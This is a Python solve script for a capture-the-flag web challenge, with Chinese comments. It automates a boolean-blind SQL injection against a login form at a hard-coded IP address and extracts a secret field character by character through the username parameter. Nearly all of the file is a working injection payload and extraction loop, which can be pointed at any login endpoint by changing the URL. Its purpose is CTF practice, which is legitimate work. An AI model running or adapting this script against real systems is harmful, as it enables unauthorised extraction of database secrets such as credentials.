#!/usr/bin/env python3
"""
题目名称: Novruzland
类别: Web (SQL 注入 - 布尔盲注)
解题思路:
    1. 登录接口的 username 字段存在 SQL 注入漏洞
    2. 利用 ORDER BY 比较逐字符提取 secret 字段
    3. 根据 "Incorrect" 关键词判断比较结果
    4. 逐位爆破出完整 flag
"""

import sys

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_URL = "http://95.111.234.103:33097/login"
# 爆破字符集
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-}"


def check_candidate(test_str: str, url: str = TARGET_URL) -> bool:
    """测试当前猜测字符串是否比 secret 小"""
    data = {
        "username": f"' OR secret>'{test_str}'-- ",
        "password": "kerrev",
    }
    r = requests.post(url, data=data, timeout=10)
    return "Incorrect" in r.text


def main():
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    known = "novruzctf{"

    try:
        for pos in range(1, 81):
            found = False
            for c in CHARSET:
                if check_candidate(known + c + "~", url):
                    known += c
                    print(f"pos {pos}: {known}")
                    found = True
                    break
            if not found or known.endswith("}"):
                break
        print("flag:", known)
    except requests.RequestException as e:
        print(f"[!] 请求失败 (已提取: {known}): {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
